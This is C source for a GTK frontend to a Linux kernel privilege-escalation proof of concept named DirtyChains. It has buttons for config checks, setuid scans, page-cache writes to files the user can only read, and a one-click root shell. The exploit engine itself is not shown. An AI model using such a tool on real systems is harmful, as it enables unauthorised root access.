        gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_offset), "0x0");
        gtk_widget_set_tooltip_text(a->entry_offset,
                                    "通用写起始偏移，支持 0x 前缀；留空为 0");
        gtk_box_pack_start(GTK_BOX(row), a->entry_offset, FALSE, FALSE, 0);

        a->chk_nobackup = gtk_check_button_new_with_label("不备份");
        gtk_widget_set_tooltip_text(a->chk_nobackup,
                                    "跳过写入前的备份。默认会先备份目标文件。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_nobackup, FALSE, FALSE, 0);

        a->chk_verbose = gtk_check_button_new_with_label("详细日志");
        gtk_widget_set_tooltip_text(a->chk_verbose,
                                    "输出更多调试信息 (-v)，用于定位失败原因。");
        gtk_box_pack_start(GTK_BOX(row), a->chk_verbose, FALSE, FALSE, 0);

        gtk_grid_attach(GTK_GRID(grid), row, 1, 3, 2, 1);
    }

    return grid;
}

static GtkWidget *build_actions(App *a)
{
    GtkWidget *box = gtk_button_box_new(GTK_ORIENTATION_HORIZONTAL);

    gtk_button_box_set_layout(GTK_BUTTON_BOX(box), GTK_BUTTONBOX_START);
    gtk_box_set_spacing(GTK_BOX(box), 6);

    a->btn_check = gtk_button_new_with_label("检查配置");
    gtk_widget_set_tooltip_text(a->btn_check,
                                "读取内核 .config 与模块状态，判断每条链的前提是否满足");
    gtk_container_add(GTK_CONTAINER(box), a->btn_check);

    a->btn_test = gtk_button_new_with_label("自测");
    gtk_widget_set_tooltip_text(a->btn_test,
                                "只写自己创建的临时文件，验证写原语是否真的生效");
    gtk_container_add(GTK_CONTAINER(box), a->btn_test);

    a->btn_find = gtk_button_new_with_label("扫描 setuid");
    gtk_widget_set_tooltip_text(a->btn_find,
                                "列出 setuid-root 文件并评估 nosuid / 只读挂载");
    gtk_container_add(GTK_CONTAINER(box), a->btn_find);

    a->btn_write = gtk_button_new_with_label("通用写");
    gtk_widget_set_tooltip_text(a->btn_write,
                                "把 -set 的内容写进 -to 的页缓存，写完校验但不执行");
    gtk_container_add(GTK_CONTAINER(box), a->btn_write);

    a->btn_lpe = gtk_button_new_with_label("一键提权");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_lpe),
                                "suggested-action");
    gtk_widget_set_tooltip_text(a->btn_lpe,
                                "执行所选链的 -start；成功后这里会变成 root shell");
    gtk_container_add(GTK_CONTAINER(box), a->btn_lpe);

    a->btn_stop = gtk_button_new_with_label("停止");
    gtk_style_context_add_class(gtk_widget_get_style_context(a->btn_stop),
                                "destructive-action");
    gtk_widget_set_sensitive(a->btn_stop, FALSE);
    gtk_container_add(GTK_CONTAINER(box), a->btn_stop);

    return box;
}

/*
 * 左上角「展开」拉开的任务抽屉。
 *
 * 纯列表版式: 每个条目是一类漏洞 (UAF类 / ESP类 / ...), 点条目等于选链,
 * 与顶部下拉框双向联动。对应链的全名放在条目 tooltip 里。
 */
#define SIDEBAR_W 268

static void side_select(App *a, int idx)
{
    GtkListBoxRow *row;

    if (!a->task_list)
        return;
    row = gtk_list_box_get_row_at_index(GTK_LIST_BOX(a->task_list), idx);
    if (!row)
        return;
    a->side_sync = TRUE;
    gtk_list_box_select_row(GTK_LIST_BOX(a->task_list), row);
    a->side_sync = FALSE;
}

static void on_task_row_selected(GtkListBox *lb, GtkListBoxRow *row, gpointer data)
{
    App *a = data;
    int idx;

    (void)lb;
    if (a->side_sync || !row)
        return;
    idx = gtk_list_box_row_get_index(row);
    if (idx < 0 || idx > N_CHAINS)
        return;
    if (gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)) != idx)
        gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), idx);
}

static GtkWidget *build_task_sidebar(App *a)
{
    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *scroller, *list;
    int i;

    gtk_widget_set_name(box, "sidebar");
    gtk_widget_set_size_request(box, SIDEBAR_W, -1);

    /* ── 条目列表 ── */
    scroller = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_name(scroller, "sidescroll");
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_NEVER, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);

    list = gtk_list_box_new();
    gtk_widget_set_name(list, "tasklist");
    gtk_list_box_set_selection_mode(GTK_LIST_BOX(list), GTK_SELECTION_SINGLE);
    gtk_list_box_set_activate_on_single_click(GTK_LIST_BOX(list), TRUE);

    for (i = 0; i <= N_CHAINS; i++) {
        GtkWidget *row = gtk_list_box_row_new();
        GtkWidget *l = gtk_label_new(i == 0 ? "全部类 · 检查 / 自测"
                                            : chains[i - 1].cls);

        gtk_label_set_xalign(GTK_LABEL(l), 0.0f);
        gtk_widget_set_halign(l, GTK_ALIGN_START);
        gtk_widget_set_valign(l, GTK_ALIGN_CENTER);
        if (i > 0)
            gtk_widget_set_tooltip_text(row, chains[i - 1].name);
        gtk_container_add(GTK_CONTAINER(row), l);
        gtk_container_add(GTK_CONTAINER(list), row);
    }
    a->task_list = list;
    g_signal_connect(list, "row-selected", G_CALLBACK(on_task_row_selected), a);

    gtk_container_add(GTK_CONTAINER(scroller), list);
    gtk_widget_set_margin_top(scroller, 12);
    gtk_widget_set_margin_start(scroller, 8);
    gtk_widget_set_margin_end(scroller, 8);
    gtk_widget_set_margin_bottom(scroller, 10);
    gtk_box_pack_start(GTK_BOX(box), scroller, TRUE, TRUE, 0);

    return box;
}

static GtkWidget *build_log_pane(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *card = gtk_frame_new(NULL);
    GtkWidget *scroller = gtk_scrolled_window_new(NULL, NULL);
    GtkWidget *inrow = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    GtkWidget *lbl;

    /* 底色由 frame 负责: scrolledwindow 在部分 GTK 版本不画自身背景 */
    gtk_frame_set_shadow_type(GTK_FRAME(card), GTK_SHADOW_NONE);
    gtk_widget_set_name(card, "logcard");
    gtk_widget_set_vexpand(card, TRUE);

    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroller),
                                   GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    gtk_widget_set_vexpand(scroller, TRUE);
    gtk_container_add(GTK_CONTAINER(card), scroller);

    a->logview = gtk_text_view_new();
    a->logbuf = gtk_text_view_get_buffer(GTK_TEXT_VIEW(a->logview));
    gtk_text_view_set_editable(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_cursor_visible(GTK_TEXT_VIEW(a->logview), FALSE);
    gtk_text_view_set_monospace(GTK_TEXT_VIEW(a->logview), TRUE);
    gtk_text_view_set_pixels_above_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_pixels_below_lines(GTK_TEXT_VIEW(a->logview), 1);
    gtk_text_view_set_wrap_mode(GTK_TEXT_VIEW(a->logview), GTK_WRAP_CHAR);
    gtk_text_view_set_left_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_right_margin(GTK_TEXT_VIEW(a->logview), 8);
    gtk_text_view_set_top_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_text_view_set_bottom_margin(GTK_TEXT_VIEW(a->logview), 6);
    gtk_widget_set_name(a->logview, "logview");
    gtk_container_add(GTK_CONTAINER(scroller), a->logview);

    {
        GtkTextIter end;

        gtk_text_buffer_get_end_iter(a->logbuf, &end);
        a->log_end_mark = gtk_text_buffer_create_mark(a->logbuf, "end",
                                                      &end, FALSE);
    }
    make_log_tags(a);

    /* 输入行 */
    lbl = gtk_label_new("输入");
    gtk_box_pack_start(GTK_BOX(inrow), lbl, FALSE, FALSE, 0);
    a->entry_input = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_input),
                                   "回车发送；提权成功后这里是 root shell");
    gtk_widget_set_hexpand(a->entry_input, TRUE);
    gtk_box_pack_start(GTK_BOX(inrow), a->entry_input, TRUE, TRUE, 0);

    a->btn_send = gtk_button_new_with_label("发送");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_send, FALSE, FALSE, 0);

    a->btn_ctrlc = gtk_button_new_with_label("Ctrl-C");
    gtk_widget_set_tooltip_text(a->btn_ctrlc, "向子进程发送中断信号 (0x03)");
    gtk_box_pack_start(GTK_BOX(inrow), a->btn_ctrlc, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(vbox), card, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), inrow, FALSE, FALSE, 0);

    return vbox;
}

static void on_menu_help(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    const char *lines[] = {
        "检查配置", "  读取 /proc/config.gz 或 /boot/config-$(uname -r)，",
        "  逐条判断 CONFIG 与模块加载状态。",
        "",
        "自测", "  只写自己创建的临时文件（跳过 tmpfs），",
        "  验证写原语本机是否真的生效。不碰系统文件。",
        "",
        "扫描 setuid", "  -find：列出 setuid-root 文件，标注 nosuid / 只读挂载。",
        "",
        "通用写", "  用 -set 的内容覆盖 -to 的页缓存，可带 -offset。",
        "  目标只需读权限；写完会读回校验，但不执行。",
        "",
        "一键提权", "  执行 -start。成功后本窗口的输入行即是 root shell。",
        "",
        "退出码", "  0 完成   1 未通过   2 参数或前置条件   3 本机不可用",
        NULL
    };
    GString *s = g_string_new(NULL);
    int i;

    for (i = 0; lines[i]; i++) {
        g_string_append(s, lines[i]);
        g_string_append_c(s, '\n');
    }
    show_info(a, GTK_MESSAGE_INFO, "使用说明", "各按钮在做什么", s->str);
    g_string_free(s, TRUE);
}

static void on_menu_about(GtkWidget *w, gpointer data)
{
    App *a = data;
    char body[1024];

    (void)w;

    g_snprintf(body, sizeof(body),
               "构建: %s\n内核: %s\n用户: %s (uid=%u)\n引擎: %s\n\n"
               "仅供自有机器与授权测试使用。",
               DF_BUILD, kernel_release(), user_name(), (unsigned)getuid(),
               a->poc_builtin ? "内置 (本程序 --engine)"
                              : (a->poc_path ? a->poc_path : "(未找到)"));
    show_info(a, GTK_MESSAGE_INFO, "关于", APP_TITLE, body);
}

static void on_menu_clear(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    gtk_text_buffer_set_text(a->logbuf, "", -1);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已清空");
    gtk_widget_set_name(a->status_lbl, "status-run");
}

static char *log_all_text(App *a)
{
    GtkTextIter s, e;

    gtk_text_buffer_get_bounds(a->logbuf, &s, &e);
    return gtk_text_buffer_get_text(a->logbuf, &s, &e, FALSE);
}

static void on_menu_save(GtkWidget *w, gpointer data)
{
    App *a = data;
    GtkWidget *dlg;

    (void)w;
    dlg = gtk_file_chooser_dialog_new("保存日志", GTK_WINDOW(a->window),
                                      GTK_FILE_CHOOSER_ACTION_SAVE,
                                      "取消", GTK_RESPONSE_CANCEL,
                                      "保存", GTK_RESPONSE_ACCEPT, NULL);
    gtk_file_chooser_set_current_name(GTK_FILE_CHOOSER(dlg), "dirtychains-log.txt");
    gtk_file_chooser_set_do_overwrite_confirmation(GTK_FILE_CHOOSER(dlg), TRUE);

    if (gtk_dialog_run(GTK_DIALOG(dlg)) == GTK_RESPONSE_ACCEPT) {
        char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(dlg));
        char *txt = log_all_text(a);

        if (fn && txt && g_file_set_contents(fn, txt, -1, NULL)) {
            char msg[PATH_MAX + 32];
            g_snprintf(msg, sizeof(msg), "日志已保存: %s", fn);
            gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
        } else {
            gtk_label_set_text(GTK_LABEL(a->status_lbl), "保存失败");
          }
        g_free(txt);
        g_free(fn);
    }
    gtk_widget_destroy(dlg);
}

static void on_menu_copy(GtkWidget *w, gpointer data)
{
    App *a = data;
    char *txt = log_all_text(a);

    (void)w;
    gtk_clipboard_set_text(gtk_clipboard_get(GDK_SELECTION_CLIPBOARD), txt, -1);
    g_free(txt);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "日志已复制到剪贴板");
}

static void on_window_destroy(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running) {
        app_kill(a, SIGKILL);
        g_spawn_close_pid(a->pid);
    }
    gtk_main_quit();
}

static GtkWidget *build_header(App *a)
{
    GtkWidget *hb = gtk_header_bar_new();
    GtkWidget *mb = gtk_menu_button_new();
    GtkWidget *menu = gtk_menu_new();
    GtkWidget *mi;

    gtk_header_bar_set_title(GTK_HEADER_BAR(hb), APP_TITLE);
    gtk_header_bar_set_subtitle(GTK_HEADER_BAR(hb), APP_SUBTITLE);
    gtk_header_bar_set_show_close_button(GTK_HEADER_BAR(hb), TRUE);

    /* 左上角: 展开 / 收起扩展面板 */
    {
        GtkWidget *ebox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 4);

        a->img_expand = gtk_image_new_from_icon_name("go-next-symbolic",
                                                     GTK_ICON_SIZE_MENU);
        a->lbl_expand = gtk_label_new("展开");
        gtk_box_pack_start(GTK_BOX(ebox), a->img_expand, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(ebox), a->lbl_expand, FALSE, FALSE, 0);

        a->btn_expand = gtk_toggle_button_new();
        gtk_widget_set_valign(a->btn_expand, GTK_ALIGN_CENTER);
        gtk_container_add(GTK_CONTAINER(a->btn_expand), ebox);
        gtk_widget_set_tooltip_text(a->btn_expand, "展开 / 收起扩展面板");
        g_signal_connect(a->btn_expand, "toggled",
                         G_CALLBACK(on_toggle_expand), a);
        gtk_header_bar_pack_start(GTK_HEADER_BAR(hb), a->btn_expand);
    }

    gtk_button_set_image(GTK_BUTTON(mb),
                         gtk_image_new_from_icon_name("open-menu-symbolic",
                                                      GTK_ICON_SIZE_BUTTON));
    gtk_widget_set_tooltip_text(mb, "菜单");

    mi = gtk_menu_item_new_with_label("复制日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_copy), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("保存日志…");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_save), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("清空日志");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_clear), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("使用说明");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_help), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_separator_menu_item_new();
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    mi = gtk_menu_item_new_with_label("关于");
    g_signal_connect(mi, "activate", G_CALLBACK(on_menu_about), a);
    gtk_menu_shell_append(GTK_MENU_SHELL(menu), mi);

    gtk_widget_show_all(menu);
    gtk_menu_button_set_popup(GTK_MENU_BUTTON(mb), menu);
    gtk_header_bar_pack_end(GTK_HEADER_BAR(hb), mb);

    return hb;
}

static void build_window(App *a)
{
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    GtkWidget *head = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    GtkWidget *chainbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
    GtkWidget *frame_params, *frame_actions, *pane, *overlay;
    GtkWidget *statusbar = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    char status[256];

    a->window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(a->window), APP_TITLE);
    /* 小屏幕 (1024x600 之类) 上不要撑出屏幕外, 留出面板和标题栏 */
    {
        GdkDisplay *dpy = gdk_display_get_default();
        GdkMonitor *mon = dpy ? gdk_display_get_primary_monitor(dpy) : NULL;
        GdkRectangle geo = { 0, 0, 1280, 800 };
        int ww, hh;

        if (mon)
            gdk_monitor_get_workarea(mon, &geo);   /* 已扣掉面板/任务栏 */
        /* 左右各留 40px: 小屏上窗口贴边后不容易再拖回来 */
        ww = MIN(980, geo.width - 80);
        hh = MIN(760, geo.height - 90);
        if (ww < 640)
            ww = 640;
        if (hh < 460)
            hh = 460;
        gtk_window_set_default_size(GTK_WINDOW(a->window), ww, hh);
    }
    gtk_window_set_icon_name(GTK_WINDOW(a->window), "security-high");
    gtk_widget_set_name(a->window, "mainwin");

    a->header = build_header(a);
    gtk_window_set_titlebar(GTK_WINDOW(a->window), a->header);

    /* 背景层: overlay 的底层 child, 随窗口伸缩 */
    overlay = gtk_overlay_new();
    a->bg_area = gtk_drawing_area_new();
    gtk_widget_set_hexpand(a->bg_area, TRUE);
    gtk_widget_set_vexpand(a->bg_area, TRUE);
    g_signal_connect(a->bg_area, "draw", G_CALLBACK(on_bg_draw), a);
    g_signal_connect(a->window, "configure-event", G_CALLBACK(on_configure), a);
    gtk_container_add(GTK_CONTAINER(overlay), a->bg_area);
    gtk_container_add(GTK_CONTAINER(a->window), overlay);

    /* ── 顶部: 链选择 + 说明 ── */
    gtk_widget_set_name(head, "chainbox");
    gtk_widget_set_margin_start(head, 12);
    gtk_widget_set_margin_end(head, 12);
    gtk_widget_set_margin_top(head, 8);

    a->combo = gtk_combo_box_text_new();
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
                                   "全部（dirtychains 五链，仅检查 / 自测）");
    {
        int i;
        for (i = 0; i < N_CHAINS; i++) {
            char label[128];
            g_snprintf(label, sizeof(label), "%s", chains[i].tag);
            gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo), label);
        }
    }
    gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), 0);
    gtk_widget_set_size_request(a->combo, 260, -1);
    gtk_widget_set_halign(a->combo, GTK_ALIGN_START);
    gtk_box_pack_start(GTK_BOX(chainbox), a->combo, FALSE, FALSE, 0);

    a->lbl_name = gtk_label_new(NULL);
    gtk_widget_set_halign(a->lbl_name, GTK_ALIGN_START);
    gtk_label_set_use_markup(GTK_LABEL(a->lbl_name), TRUE);
    gtk_widget_set_name(a->lbl_name, "title-name");
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_name, FALSE, FALSE, 0);

    a->lbl_desc = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->lbl_desc), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_desc), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_desc, FALSE, FALSE, 0);

    a->lbl_need = gtk_label_new(NULL);
    gtk_widget_set_name(a->lbl_need, "hint");
    gtk_label_set_xalign(GTK_LABEL(a->lbl_need), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_need), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_need, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(head), chainbox, FALSE, FALSE, 0);

    /* ── root 警告横幅 ── */
    a->banner = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    gtk_widget_set_name(a->banner, "banner-warn");
    a->banner_lbl = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->banner_lbl), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->banner_lbl), TRUE);
    gtk_box_pack_start(GTK_BOX(a->banner), a->banner_lbl, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(head), a->banner, FALSE, FALSE, 0);
    gtk_widget_set_no_show_all(a->banner, TRUE);

    /* ── 参数区 ── */
    frame_params = gtk_frame_new("参数");
    gtk_style_context_add_class(gtk_widget_get_style_context(frame_params), "card");
    gtk_widget_set_margin_start(frame_params, 12);
    gtk_widget_set_margin_end(frame_params, 12);
    gtk_widget_set_margin_top(frame_params, 8);
    {
        GtkWidget *inner = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
        GtkWidget *p = build_params(a);

        gtk_widget_set_margin_start(p, 10);
        gtk_widget_set_margin_end(p, 10);
        gtk_widget_set_margin_top(p, 8);
        gtk_widget_set_margin_bottom(p, 8);
        gtk_box_pack_start(GTK_BOX(inner), p, FALSE, FALSE, 0);
        gtk_container_add(GTK_CONTAINER(frame_params), inner);
    }

    /* ── 按钮区 ── */
    frame_actions = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_set_margin_start(frame_actions, 12);
    gtk_widget_set_margin_end(frame_actions, 12);
    gtk_widget_set_margin_top(frame_actions, 8);
    gtk_box_pack_start(GTK_BOX(frame_actions), build_actions(a), TRUE, TRUE, 0);

    /* ── 日志 ── */
    pane = build_log_pane(a);
    gtk_widget_set_margin_start(pane, 12);
    gtk_widget_set_margin_end(pane, 12);
    gtk_widget_set_margin_top(pane, 8);
    gtk_widget_set_margin_bottom(pane, 6);
    gtk_widget_set_vexpand(pane, TRUE);

    /* ── 状态栏 ── */
    gtk_widget_set_margin_start(statusbar, 12);
    gtk_widget_set_margin_end(statusbar, 12);
    gtk_widget_set_margin_bottom(statusbar, 8);

    a->spinner = gtk_spinner_new();
    gtk_box_pack_start(GTK_BOX(statusbar), a->spinner, FALSE, FALSE, 0);

    a->status_lbl = gtk_label_new("就绪");
    gtk_widget_set_name(a->status_lbl, "status-run");
    gtk_label_set_xalign(GTK_LABEL(a->status_lbl), 0.0f);
    gtk_box_pack_start(GTK_BOX(statusbar), a->status_lbl, TRUE, TRUE, 0);

    {
        GtkWidget *env = gtk_label_new(NULL);
        gtk_widget_set_name(env, "hint");
        g_snprintf(status, sizeof(status), "%s · %s · 内核 %s",
                   user_name(), getuid() == 0 ? "root" : "普通用户",
                   kernel_release());
        gtk_label_set_text(GTK_LABEL(env), status);
        gtk_box_pack_end(GTK_BOX(statusbar), env, FALSE, FALSE, 0);
    }

    gtk_box_pack_start(GTK_BOX(vbox), head, FALSE, FALSE, 0);

    /* ── 任务抽屉 (左上角「展开」控制, 从左侧推挤出来) ── */
    a->revealer = gtk_revealer_new();
    gtk_revealer_set_transition_type(GTK_REVEALER(a->revealer),
                                     GTK_REVEALER_TRANSITION_TYPE_SLIDE_RIGHT);
    gtk_revealer_set_transition_duration(GTK_REVEALER(a->revealer), 180);
    gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), FALSE);
    gtk_widget_set_vexpand(a->revealer, TRUE);
    gtk_widget_set_valign(a->revealer, GTK_ALIGN_FILL);
    gtk_container_add(GTK_CONTAINER(a->revealer), build_task_sidebar(a));

    gtk_box_pack_start(GTK_BOX(vbox), frame_params, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), frame_actions, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), pane, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), statusbar, FALSE, FALSE, 0);

    gtk_widget_set_hexpand(vbox, TRUE);
    gtk_widget_set_vexpand(vbox, TRUE);
    gtk_widget_set_halign(vbox, GTK_ALIGN_FILL);
    gtk_widget_set_valign(vbox, GTK_ALIGN_FILL);

    /* 抽屉在主内容左边, 展开时把正文推开而不是盖住 */
    {
        GtkWidget *shell = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);

        gtk_box_pack_start(GTK_BOX(shell), a->revealer, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(shell), vbox, TRUE, TRUE, 0);
        gtk_widget_set_halign(shell, GTK_ALIGN_FILL);
        gtk_widget_set_valign(shell, GTK_ALIGN_FILL);
        gtk_overlay_add_overlay(GTK_OVERLAY(overlay), shell);
    }

    /* 列表初始选中项跟随下拉框 */
    side_select(a, gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)));

    /* ── 信号 ── */
    g_signal_connect(a->combo, "changed", G_CALLBACK(on_combo_changed), a);
    g_signal_connect(a->btn_check, "clicked", G_CALLBACK(act_check), a);
    g_signal_connect(a->btn_test, "clicked", G_CALLBACK(act_test), a);
    g_signal_connect(a->btn_find, "clicked", G_CALLBACK(act_find), a);
    g_signal_connect(a->btn_lpe, "clicked", G_CALLBACK(act_lpe), a);
    g_signal_connect(a->btn_write, "clicked", G_CALLBACK(act_write), a);
    g_signal_connect(a->btn_stop, "clicked", G_CALLBACK(act_stop), a);
    g_signal_connect(a->btn_send, "clicked", G_CALLBACK(act_send), a);
    g_signal_connect(a->btn_ctrlc, "clicked", G_CALLBACK(act_ctrlc), a);
    g_signal_connect(a->entry_input, "activate", G_CALLBACK(on_entry_activate), a);
    g_signal_connect(a->window, "destroy", G_CALLBACK(on_window_destroy), a);

    /* 浏览按钮: file-set 后把本地路径填进 entry */
    /* (在 build_params 里已断开错误连接, 这里统一重连) */

    update_desc(a);

    /* root 警告 */
    if (getuid() == 0) {
        gtk_label_set_text(GTK_LABEL(a->banner_lbl),
                           "当前以 root 运行：提权链无法证明有效，-test 结果也没有参考价值。"
                           "请用普通用户身份启动本程序。");
        gtk_widget_set_no_show_all(a->banner, FALSE);
        gtk_widget_show_all(a->banner);
    }
}

/* ---------------------------------------------------------------------------
 * main
 * ------------------------------------------------------------------------ */
int main(int argc, char **argv)
{
    App app;
    const char *poc = NULL;
    const char *bg = NULL;
    int i, j;

    /*
     * 内部引擎模式: GUI 启动子进程时 exec 自身并加上 --engine,
     * 这里把参数原样转给链接进来的 poc 入口, 行为与独立 poc 完全一致。
     */
    if (argc > 1 && !strcmp(argv[1], "--engine")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = dirtychains_poc_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第二条内置引擎: CVE-2026-64531 (OVS)，入口名不同 */
    if (argc > 1 && !strcmp(argv[1], "--ovs")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = ovswrap_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    memset(&app, 0, sizeof(app));
    app.master_fd = -1;
    app.cur_fg = -1;
    app.csi = g_string_new(NULL);
    app.run = g_string_new(NULL);

    /* 先摘掉自己的参数, 免得 gtk_init 报错 */
    for (i = 1, j = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--poc") && i + 1 < argc) {
            poc = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--bg") && i + 1 < argc) {
            bg = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            printf("用法: %s [--poc <路径>] [--bg <图片>]\n\n"
                   "  --poc <路径>   改用外部 poc 可执行文件 (默认用内置引擎,\n"
                   "                 也可用环境变量 DIRTYCHAINS_POC)\n"
                   "  --bg  <图片>   指定窗口背景图 (默认找同目录 bg.png,\n"
                   "                 其次 assets/bg.png 与 /usr/share/dirtychains/)\n"
                   "                 也可用环境变量 DIRTYCHAINS_BG\n", argv[0]);
            return 0;
        }
        argv[j++] = argv[i];
    }
    argc = j;
    argv[argc] = NULL;

    app.poc_path = find_poc(poc, &app.poc_builtin);
    app.bg_path = find_bg(bg);

    gtk_init(&argc, &argv);
    install_css();

    if (app.bg_path) {
        GError *err = NULL;

        app.bg_pix = gdk_pixbuf_new_from_file(app.bg_path, &err);
        if (!app.bg_pix) {
            fprintf(stderr, "背景图加载失败 (%s): %s\n", app.bg_path,
                    err ? err->message : "未知错误");
            g_clear_error(&err);
        }
    }

    build_window(&app);

    gtk_widget_show_all(app.window);

    /* 启动横幅写入日志 */
    {
        char head[512];
        g_snprintf(head, sizeof(head),
                   "\033[36mDirtyChains 六链页缓存提权 PoC\033[0m  图形前端"
                   "  \033[2m构建 %s\033[0m\n"
                   "\033[2m引擎: %s\033[0m\n"
                   "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
                   DF_BUILD,
                   app.poc_builtin ? "内置 (本程序 --engine)"
                                   : (app.poc_path ? app.poc_path : "未找到"));
        ansi_feed(&app, head, strlen(head));
        log_flush(&app);
    }

    if (!app.poc_path) {
        log_append_plain(&app,
                         "\n[!] 引擎不可用 (无法定位本程序路径)。\n"
                         "    可用 --poc <路径> 指定外部 poc。\n");
        gtk_label_set_text(GTK_LABEL(app.status_lbl), "引擎不可用");
        gtk_widget_set_name(app.status_lbl, "status-err");
    }

    gtk_main();

    if (app.csi)
        g_string_free(app.csi, TRUE);
    if (app.run)
        g_string_free(app.run, TRUE);
    g_free(app.poc_path);
    g_free(app.bg_path);
    if (app.bg_pix)
        g_object_unref(app.bg_pix);
    if (app.bg_surf)
        cairo_surface_destroy(app.bg_surf);

    return app.last_exit ? 1 : 0;
}

#endif /* !OVSWRAP_STANDALONE */
